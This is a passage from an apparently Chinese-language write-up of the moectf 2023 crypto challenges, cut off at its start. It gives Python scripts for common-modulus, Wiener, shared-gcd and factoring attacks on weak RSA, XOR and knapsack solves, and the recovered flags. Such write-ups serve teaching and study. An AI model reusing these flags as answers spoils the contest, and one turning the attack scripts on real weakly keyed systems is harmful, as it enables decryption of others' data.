class="hljs-attribute">q</span>=11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819<br><span class="hljs-attribute">c</span>=63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805<br><span class="hljs-attribute">n</span>=p*q<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><span class="hljs-built_in">print</span>(gcd(e,p-1))   #e|(p-1), gcd(e,q-1)=1<br><span class="hljs-attribute">d</span>=invert(e,(q-1))<br><span class="hljs-attribute">m</span>=powmod(c,d,q)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru&#125;<br></code></pre></td></tr></table></figure><h3 id="xorrrrrrrrr"><a href="#xorrrrrrrrr" class="headerlink" title="xorrrrrrrrr"></a><strong>xorrrrrrrrr</strong></h3><p>​     先拿moectf{去和密文xor，根据密文翻译出来的明文猜测明文后面的单词，再与该段密文xor得到部分flag，重复操作，最终得到完整flag</p><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl&#125;<br></code></pre></td></tr></table></figure><p><strong>factor_signin</strong></p><p>​    观察代码可知flag为rsa加密，前半部分的n1&#x3D;p * q，后半部分n2&#x3D;p1 * p2 * p3…p32,编写脚本得到两段flag，组合起来</p><p>脚本: </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">from</span> gmpy2 import *<br><br><br><span class="hljs-attribute">p</span>=<span class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br><br><span class="hljs-attribute">q</span>=<span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br><br><span class="hljs-attribute">c1</span>=<span class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-attribute">e</span>=<span class="hljs-number">65537</span><br><br><span class="hljs-attribute">d1</span>=invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-attribute">m1</span>=powmod(c1,d1,p*q)<br><span class="hljs-attribute">print</span>(long_to_bytes(m1))<br><span class="hljs-attribute">a</span>=[<span class="hljs-number">9949603102225364603</span>,<span class="hljs-number">10049235158029375571</span>,<span class="hljs-number">10547615587767500213</span>,<span class="hljs-number">10596280721192026229</span>,<span class="hljs-number">10864078180916418691</span>,<span class="hljs-number">11092420583960163379</span>,<span class="hljs-number">11853704782834170959</span>,<span class="hljs-number">12034779627328165471</span>,<span class="hljs-number">12404642343676224637</span>,<span class="hljs-number">12448177342966243757</span>,<span class="hljs-number">13062839684118954553</span>,<span class="hljs-number">13645878578452317313</span>,<span class="hljs-number">14397830993057803133</span>,<span class="hljs-number">14619040595108594017</span>,<span class="hljs-number">14678737767649343977</span>,<span class="hljs-number">14745811312384518031</span>,<span class="hljs-number">14813953870710226847</span>,<span class="hljs-number">15175734709842430433</span>,<span class="hljs-number">15211380502610462057</span>,<span class="hljs-number">15332916111580607077</span>,<span class="hljs-number">15751974537676958401</span>,<span class="hljs-number">16123604149048919099</span>,<span class="hljs-number">16408421615173973083</span>,<span class="hljs-number">16870346804576162551</span>,<span class="hljs-number">17093292308638969889</span>,<span class="hljs-number">17265001711647542137</span>,<span class="hljs-number">17289161209347211817</span>,<span class="hljs-number">17543713628803023199</span>,<span class="hljs-number">17673334943789572513</span>,<span class="hljs-number">18106525049998616747</span>,<span class="hljs-number">18345408081492711641</span>,<span class="hljs-number">18390046459144888243</span>]<br><span class="hljs-attribute">c2</span>=<span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br><span class="hljs-attribute">n2</span>=<span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><span class="hljs-attribute">phi</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">32</span>):<br>    <span class="hljs-attribute">phi</span> *= a[i]-<span class="hljs-number">1</span><br><span class="hljs-attribute">d2</span>=invert(e,phi)<br><span class="hljs-attribute">m2</span>=powmod(c2,d2,n2)<br><span class="hljs-attribute">print</span>(long_to_bytes(m2))<br></code></pre></td></tr></table></figure><p>flag： </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;fACtord<span class="hljs-number">6</span>_A<span class="hljs-symbol">nd_YAfu_Are_6</span>oth_good_utils_to_fACtorize_<span class="hljs-symbol">num6</span>ers_ff<span class="hljs-number">90</span>S&#125;<br></code></pre></td></tr></table></figure><h3 id="feistel"><a href="#feistel" class="headerlink" title="feistel"></a><strong>feistel</strong></h3><p>​    将密文明文互换，再用加密脚本加密既可解密出flag</p><img src="/2023/10/01/moectf2023/clip_image022.png" class title="img"><h3 id="n-n"><a href="#n-n" class="headerlink" title="n&amp;n"></a><strong>n&amp;n</strong></h3><p>​    观察代码，得到e1，e2，c1，c2，n，故采用共模攻击</p><p>编写脚本得到flag</p><p>脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br>e1 = 0x114514<br>e2 = 19198101<br><span class="hljs-attribute">c1</span>=5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925<br>c2= 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360<br><span class="hljs-attribute">n</span>=13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531<br><span class="hljs-attribute">s</span>=gcdext(e1,e2)<br><span class="hljs-attribute">s1</span>=s[1]<br><span class="hljs-attribute">s2</span>=s[2]<br><span class="hljs-attribute">m</span>=powmod(c1,s1,n)<br><span class="hljs-attribute">a</span>=powmod(c2,s2,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m<span class="hljs-number">*a</span>%n))<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;dO_nOt_u53_5AM3_MOdulu5_tO_3ncrYPt_dIFF3r3nt_dAtA!_JY63x33iiA0Ji&#125;</span><br></code></pre></td></tr></table></figure><h3 id="p-q"><a href="#p-q" class="headerlink" title="|p-q|"></a><strong>|p-q|</strong></h3><p>N分解得到p，q，编写rsa解题脚本，得flag</p><p>flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez_chain"></a><strong>ez_chain</strong></h3><p>​    运用到辗转相除法、cbc加密，但是不知道key，通过构造相同位数的flag，发现flag内容怎么修改，最后的余数都不会变，猜测最后那一部分和moect{有关，修改查看，发现最后一个余数改变，确定猜测，该余数即为blocks[0]，同时已知密文、iv，异或求得key。</p><p>代码:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">a</span>=[<span class="hljs-number">8490961288</span>, <span class="hljs-number">122685644196</span>, <span class="hljs-number">349851982069</span>, <span class="hljs-number">319462619019</span>, <span class="hljs-number">74697733110</span>,<br>   <span class="hljs-attribute">43107579733</span>, <span class="hljs-number">465430019828</span>, <span class="hljs-number">178715374673</span>, <span class="hljs-number">425695308534</span>, <span class="hljs-number">164022852989</span>,<br>   <span class="hljs-attribute">435966065649</span>, <span class="hljs-number">222907886694</span>, <span class="hljs-number">420391941825</span>, <span class="hljs-number">173833246025</span>, <span class="hljs-number">329708930734</span>]<br><span class="hljs-attribute">iv</span> = <span class="hljs-number">3735927943</span><br><span class="hljs-attribute">base</span> = bytes_to_long(b<span class="hljs-string">&quot;koito&quot;</span>)<br><span class="hljs-attribute">key</span>=<span class="hljs-number">5329712293</span>^a[<span class="hljs-number">0</span>]^iv<br><span class="hljs-attribute">b</span>=[iv]<br><span class="hljs-attribute">for</span> i in range(len(a)-<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">b</span>.append(a[len(a)-<span class="hljs-number">2</span>-i]^a[len(a)-<span class="hljs-number">1</span>-i]^key)<br><span class="hljs-attribute">b</span>.append(a[<span class="hljs-number">0</span>]^b[<span class="hljs-number">0</span>]^key)<br><span class="hljs-attribute">a1</span>=list(reversed(b[<span class="hljs-number">1</span>:]))<br><span class="hljs-attribute">m</span>=a1[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,len(a1)):<br>    <span class="hljs-attribute">m</span> = base*m+a1[i]<br><span class="hljs-attribute">flag</span> = long_to_bytes(m)<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="minipack"><a href="#minipack" class="headerlink" title="minipack"></a><strong>minipack</strong></h3><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> key=[]<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;E:\\key.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>   key1 = fs.read().split(<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;[&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;]&#x27;</span>)<br> key1[<span class="hljs-number">0</span>]=key1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br> key1[-<span class="hljs-number">1</span>]=key1[-<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key1:<br>   key.append(<span class="hljs-built_in">int</span>(i))<br> key = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(key))<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;E:\\ciphertext.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>   cip = <span class="hljs-built_in">int</span>(fs.read())<br> m = <span class="hljs-string">&#x27;&#x27;</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>   <span class="hljs-keyword">if</span> cip - key[i] &gt;= <span class="hljs-number">0</span>:<br>     cip = cip - key[i]<br>     m += <span class="hljs-string">&#x27;1&#x27;</span><br>   <span class="hljs-keyword">else</span>:<br>     m += <span class="hljs-string">&#x27;0&#x27;</span><br> <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure><h3 id="giant-e"><a href="#giant-e" class="headerlink" title="giant_e"></a><strong>giant_e</strong></h3><p>​    rsa解题，e特别大，采用winerer攻击</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,numerator,denumerator</span>):<br>        self.numberlist = [] <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = [] <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList (numerator, denumerator)<br>        self.GenerateFractionList ()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span> (self, numerator, denumerator):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append (quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span> (self) :<br>        self.fractionlist.append ([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span> (self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (i) :<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i-j-<span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br><br>e = <span class="hljs-number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span><br>n=<span class="hljs-number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span><br>c=<span class="hljs-number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span><br>a = ContinuedFraction(e,n)<br><span class="hljs-keyword">for</span> k,d <span class="hljs-keyword">in</span> a.fractionlist:<br>    s = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(s.decode())<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP&#125;<br></code></pre></td></tr></table></figure><h3 id="rsa-signin"><a href="#rsa-signin" class="headerlink" title="rsa_signin"></a><strong>rsa_signin</strong></h3><p>​    出现多组c，n，可以考虑低加密指数广播攻击，但e&#x3D;65337，比较大，不使用中国剩余定理，考虑在n_list找最大公因数，编写脚本得flag</p><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">65537</span><br>n1 =<br>…<br>n11 =<br>c1 =<br>…<br>c11 =<br>c = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]<br>n = [n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>        <span class="hljs-keyword">if</span> (i != j):<br>            <span class="hljs-keyword">if</span> (gmpy2.gcd(n[i], n[j]) != <span class="hljs-number">1</span>):  <span class="hljs-comment"># 对不同的n进行 欧几里得算法，以求出最大公约数(p)</span><br>                <span class="hljs-built_in">print</span>(i, j)  <span class="hljs-comment"># 输出对应的n的序号</span><br>                p = gmpy2.gcd(n[i], n[j])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p = &quot;</span>, p)<br>                q = n[i] // p<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q = &quot;</span>, q)<br>                d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d = &quot;</span>, d)<br>                m = <span class="hljs-built_in">pow</span>(c[i], d, n[i])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;m = &quot;</span>, m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">it_is_re@</span><span class="hljs-symbol">lly_@</span><span class="hljs-symbol">_signin_level_cryPto_ch@</span><span class="hljs-symbol">ll@</span>nge_ng92WPIBung92WPIBun&#125;<br></code></pre></td></tr></table></figure><h3 id="factorize-me"><a href="#factorize-me" class="headerlink" title="factorize_me!"></a><strong>factorize_me!</strong></h3><p>​    无法直接分解n，观察代码，发现n是由prime2累乘得到，而prime2可以由prime得到，而prime累乘数已经告知，尝试分解，得到al数组，编写脚本</p><p>脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">al=[6811480804433459752827714558479851837166061762294131563310130325846430072816177165149613687307165209577130630311477665591141650399740741396784593477667511,<br>6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347281,<br>7592439908930473591169395506464664967460880934907692099467559610659035874008829133810341129161864445676397227262130671224157308868678442281617413952593477,<br>7661276973316857207751367277881032536449069939447322837508906694964933673171693624171780997296797446643574508184011878230465391879808258241752897792891323,<br>8752762682421281693932454897190422008900505775990831144558827755415243453970083322530846132571648469860763497724505255094464743633789884168771246977571539,<br>9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490507,<br>10022455487144667211701100343824680124338467215246658405697280466931561838565228778624923751405642974058833143888323468902504576610147119708725877528011439,<br>11627877395179828773706504422918933052041685770731872812302758181943244472706231518350716590168708806854971155512042158777017234038219076771501368374236727,<br>12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309139]<br><span class="hljs-attribute">n</span>=899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441<br>e = 65537<br>c = 841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140<br><br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-keyword">from</span> Crypto.Util.number import getPrime<br><span class="hljs-keyword">from</span> math import prod<br><span class="hljs-keyword">from</span> sympy import nextprime<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(9):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(9):<br>            <span class="hljs-attribute">q</span>=nextprime(al[i])<br>            <span class="hljs-attribute">w</span>=nextprime(al[j])<br>            <span class="hljs-attribute">r</span>=nextprime(al[k])<br>            <span class="hljs-attribute">z</span>=q*w*r<br>            <span class="hljs-keyword">if</span>(<span class="hljs-attribute">n</span>==z):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r=&quot;</span>,r)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;w=&quot;</span>,w)<br>                phi=(q-1)*(w-1)*(r-1)<br>                <span class="hljs-attribute">d</span>=invert(e,phi)<br>                <span class="hljs-attribute">m</span>=powmod(c,d,n)<br>                <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>​       